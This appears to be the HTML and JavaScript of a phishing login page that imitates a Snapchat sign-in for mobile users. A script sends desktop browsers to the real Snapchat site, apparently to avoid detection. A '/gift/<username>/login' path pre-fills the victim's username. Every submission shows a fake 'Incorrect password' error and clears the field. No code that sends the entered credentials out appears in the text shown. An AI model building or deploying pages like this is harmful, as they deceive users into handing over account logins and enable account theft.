<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log In</title>
<script>
(function(){
  const ua=navigator.userAgent.toLowerCase();
  if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){
    window.location.replace("https://accounts.snapchat.com/");
  }
})();
</script>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
  body { font-family: "Inter", sans-serif; }
  ::-webkit-scrollbar { display: none; }
  input[type="checkbox"] {
    -webkit-appearance: none; -moz-appearance: none; appearance: none;
    width: 1rem; height: 1rem; border: 2px solid #d1d5db;
    border-radius: 0.25rem; position: relative; cursor: pointer;
  }
  input[type="checkbox"]:checked::after {
    content: ''; position: absolute; left: 3.5px; top: 0.5px;
    width: 4.5px; height: 9px; border: solid #00b0ff;
    border-width: 0 2px 2px 0; transform: rotate(45deg);
  }
  input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
  #loginBtn { 
    transition: bottom 0.3s ease; 
    min-width: 42%; 
    width: 62%; 
    font-size: 1.05rem; 
    padding: 0.7rem 0; 
    display: block; 
    margin: 0 auto; 
  }
  .input-container { width: 85%; margin: 0 auto; }
  input[type="text"], input[type="password"] { 
    width: 100%;
    font-size: 16px;              /* prevent mobile zoom */
    transform: scale(0.92);       /* visually restore smaller size */
    transform-origin: left center;
    font-weight: 500; 
    padding-bottom: 0.2rem; 
    font-family: "Inter", sans-serif;
  }
  label[for="password"] { 
    position: relative; 
    top: -2px; 
    font-size: 0.75rem; 
  }
  #password { position: relative; top: -2px; }
  label.inline-flex.items-center { 
    position: relative; 
    top: -10px; /* moved closer */
    font-size: 0.825rem; 
    font-weight: 450; 
  }
  #forgotPassword { 
    position: relative; 
    top: -12px; /* moved closer */
    font-size: 0.825rem; 
    font-weight: 400; 
    color:#0083ff; 
  }
  #errorMsg { 
    width: 85%; 
    margin-left: auto; 
    margin-right: auto; 
    font-size: 0.8rem; 
    text-align: left; 
    color:#ff1952; 
    font-weight: 400;
    margin-top: -2px;
    margin-bottom: -2px;
    position: relative;
    top: -6px;
  }
  h1 { 
    position: relative; 
    top: -10px; 
    font-size: 1.7rem; 
    font-weight: 500; 
    text-align: center; 
  }
  form.flex.flex-col.space-y-6 { gap: 0.5rem; }
  .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
  .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
  .remove-btn { cursor: pointer; color: #ef4444; }
  .remove-btn:hover { color: #dc2626; }
  #adminSection { display:none; }
  #togglePassword { 
    position: absolute; 
    right: 10px; 
    top: 50%; 
    transform: translateY(-50%); 
    cursor: pointer; 
    font-size: 0.85rem; /* slightly smaller */
    color: #6b7280; 
  }
</style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen">
<div class="w-full max-w-md p-6">
  <h1>Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="input-container">
      <label for="username" class="block text-xs font-medium text-gray-700">USERNAME</label>
      <input type="text" id="username" name="username" class="border-b border-gray-300 focus:border-blue-500 outline-none" required>
    </div>
    <div class="input-container relative">
      <label for="password" class="block text-xs font-medium text-gray-700">PASSWORD</label>
      <input type="password" id="password" name="password" class="border-b border-gray-300 focus:border-blue-500 outline-none pr-10" required>
      <span id="togglePassword"><i class="fas fa-eye"></i></span>
    </div>
    <p id="errorMsg" class="hidden">Incorrect password. Please try again</p>
    <label class="inline-flex items-center input-container text-gray-700 text-sm">
      <input type="checkbox" class="mr-2"> Save Login Info on your iCloud devices
    </label>
    <a href="#" id="forgotPassword" class="input-container text-sm">Forgot your password?</a>
    <button type="submit" id="loginBtn" class="bg-[#b7c0c8] text-white rounded-2xl">Log In</button>
  </form>
</div>
<script>
  const passwordInput=document.getElementById("password");
  const togglePassword=document.getElementById("togglePassword");
  const errorMsg=document.getElementById("errorMsg");
  const loginForm=document.getElementById("loginForm");
  const loginBtn=document.getElementById("loginBtn");

  togglePassword.addEventListener("click",()=>{
    const type=passwordInput.getAttribute("type")==="password"?"text":"password";
    passwordInput.setAttribute("type",type);
    togglePassword.innerHTML=type==="password"?'<i class="fas fa-eye"></i>':'<i class="fas fa-eye-slash"></i>';
  });

  loginForm.addEventListener("submit",function(e){
    e.preventDefault();
    loginBtn.classList.remove("bg-[#00b0ff]");
    loginBtn.classList.add("bg-[#b7c0c8]");
    setTimeout(()=>{
      errorMsg.classList.remove("hidden");
      passwordInput.value="";
    },1200);
  });

  passwordInput.addEventListener("input",()=>{
    loginBtn.classList.remove("bg-[#b7c0c8]");
    loginBtn.classList.add("bg-[#00b0ff]");
    errorMsg.classList.add("hidden");
  });

  const pathParts=window.location.pathname.split("/");
  if(pathParts.length>=3 && pathParts[1]==="gift" && pathParts[3]==="login"){
    const prefillUser=pathParts[2];
    if(prefillUser) document.getElementById("username").value=prefillUser;
  }
</script>
</body>
</html>
